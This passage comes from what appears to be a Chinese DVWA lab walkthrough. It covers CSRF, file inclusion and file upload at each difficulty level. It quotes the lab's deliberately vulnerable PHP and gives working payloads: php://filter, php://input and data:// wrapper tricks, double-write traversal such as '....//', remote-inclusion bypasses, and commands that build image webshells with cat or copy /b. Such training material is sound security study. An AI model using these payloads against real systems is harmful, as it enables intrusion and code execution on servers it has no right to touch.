    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将上述文件保存为 csrf.html 然后放入到 CORS 白名单目录下，这在实战中比较少见，这里为了演示效果，我们可以将这个文件放入到靶场服务器的根目录下，然后直接访问这个页面即可发起 CSRF 攻击：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//127.0.0.1/dvwa/csrf.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Impossible-3">Impossible</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111212049060.png" alt="image-20240111212049060"></p>
<p>与之前的级别不同点在于，这里增加了一个输入框，要求用户写出当前密码，只有当前密码是正确的，才会执行修改密码的操作。</p>
<p>这对于不知道受害者原始密码的攻击者来说，根本无法完成CSRF攻击了。</p>
<h1>0x04 File Inclusion</h1>
<h2 id="Low-4">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// The page we wish to display</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到非常捡漏，对于page参数没有做任何限制，这意味着我们可以实现任意文件包含，而这里的包含函数并不在此代码中。</p>
<h3 id="文件读取">文件读取</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111212751466.png" alt="image-20240111212751466"></p>
<p>正常在linux下是是要读取/etc/passwd等文件的</p>
<h3 id="远程文件包含">远程文件包含</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111212836673.png" alt="image-20240111212836673"></p>
<h3 id="本地文件包含-Getshell">本地文件包含 Getshell</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213022537.png" alt="image-20240111213022537"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213001264.png" alt="image-20240111213001264"></p>
<p>这里需要匹配文件上传漏洞，来进行本地包含</p>
<h3 id="远程文件包含-Getshell">远程文件包含 Getshell</h3>
<p>当然这里也可以包含远程服务器上的恶意文件getshell，就不演示了</p>
<h3 id="伪协议读取">伪协议读取</h3>
<p><code>php://filter</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>page<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213224202.png" alt="image-20240111213224202"></p>
<p>解码即可</p>
<p><code>php://input getshell</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'info.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php phpinfo();?&gt;'</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213429717.png" alt="image-20240111213429717"></p>
<p>不过这里不知道是和原因，hackbar发不出去，只能bp发送</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214209787.png" alt="image-20240111214209787"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214156755.png" alt="image-20240111214156755"></p>
<p><code>data:// 伪协议</code></p>
<p>数据封装器，和 php:// 相似，可以直接执行任意 PHP 代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">/fi/?page=data:text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
/fi/?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOz8%2b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214323842.png" alt="image-20240111214323842"></p>
<h2 id="Medium-4">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// The page we wish to display</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">// Input validation</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"http://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"https://"</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"..\\"</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里加了几个过滤，将http协议与https协议过滤为空，以及防止目录穿越。</p>
<p>但这里我们注意到没有过滤伪协议，以及它仅仅是将敏感字符过滤为空，这意味着我们可以双写绕过</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?page=....<span class="token comment">//....//....//flag.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214557607.png" alt="image-20240111214557607"></p>
<p>同样的远程文件包含也可以双写绕过</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?page=<span class="token property">hhttp</span><span class="token punctuation">:</span><span class="token comment">//ttp://www.baidu.com/robots.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214750871.png" alt="image-20240111214750871"></p>
<h2 id="High-4">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// The page we wish to display</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// Input validation</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">fnmatch</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"file*"</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"include.php"</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// This isn't the page we want!</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR: File not found!"</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里说如果page参数不是以file开头的，或者不是include.php，则exit退出，很明显可以用file伪协议</p>
<h2 id="Impossible-4">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// The page we wish to display</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// Only allow include.php or file{1..3}.php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"include.php"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"file1.php"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"file2.php"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"file3.php"</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// This isn't the page we want!</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR: File not found!"</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里进行了白名单过滤，如果不是这三个指定文件中的一个，则exit退出，很明显我们无法进行攻击了。</p>
<h1>0x05 File Upload</h1>
<h2 id="Low-5">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Where are we going to be writing to?</span>
    <span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"hackable/uploads/"</span><span class="token punctuation">;</span>
    <span class="token variable">$target_path</span> <span class="token operator">.=</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Can we move the file to the upload folder?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// No</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Yes!</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$target_path</span><span class="token punctuation">}</span></span> succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先自定义了上传路径，接着直接对upload参数内容进行上传，并没有对内容做出过滤。很明显可以任意文件上传</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111215609154.png" alt="image-20240111215609154"></p>
<p>这里将上传文件路径输出了，直接跟着路径访问即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111215640275.png" alt="image-20240111215640275"></p>
<h2 id="Medium-5">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Where are we going to be writing to?</span>
    <span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"hackable/uploads/"</span><span class="token punctuation">;</span>
    <span class="token variable">$target_path</span> <span class="token operator">.=</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// File information</span>
    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'type'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Is it an image?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/jpeg"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/png"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token comment">// Can we move the file to the upload folder?</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// No</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// Yes!</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$target_path</span><span class="token punctuation">}</span></span> succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Invalid file</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>依旧是定义了上传路径，接着取出了上传文件的文件名，文件类型，文件大小。</p>
<p>如果文件类型不是jpeg或者png，且文件上传大小超出了限制，则上传失败，否则成功上传。</p>
<p>但这里只是对content-type做出了限制，我们修改即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111220057185.png" alt="image-20240111220057185"></p>
<h2 id="High-5">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Where are we going to be writing to?</span>
    <span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"hackable/uploads/"</span><span class="token punctuation">;</span>
    <span class="token variable">$target_path</span> <span class="token operator">.=</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// File information</span>
    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Is it an image?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpeg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token function">getimagesize</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token comment">// Can we move the file to the upload folder?</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// No</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// Yes!</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$target_path</span><span class="token punctuation">}</span></span> succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Invalid file</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里是取出了文件上传时的后缀名，如果不是jpg或者jpeg或者png，则上传失败。同时还使用<code>getimagesize</code>函数检测上传的文件是否为图片，这里可以使用图片马绕过。</p>
<p>Linux下图片马的制作：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"># 将 shell.php 内容追加到 pic.png
cat shell.php &gt;&gt; pic.png

# png <span class="token operator">+</span> php 合成 png 图马
cat pic.png shell.php &gt;&gt; shell.png

# 直接 echo 追加
echo <span class="token string">'&lt;?php phpinfo();?&gt;'</span> &gt;&gt; pic.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Windows下图片马的制作：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">copy pic.png/b+shell.php/a shell.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>正常制作图片马上传即可，接着利用上一关的文件包含漏洞包含png使其解析其中的PHP代码即可</p>
<h2 id="Impossible-5">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Check Anti-CSRF token</span>
    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// File information</span>
    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'type'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Where are we going to be writing to?</span>
    <span class="token variable">$target_path</span>   <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'hackable/uploads/'</span><span class="token punctuation">;</span>
    <span class="token comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span>
    <span class="token variable">$target_file</span>   <span class="token operator">=</span>  <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$uploaded_name</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span>
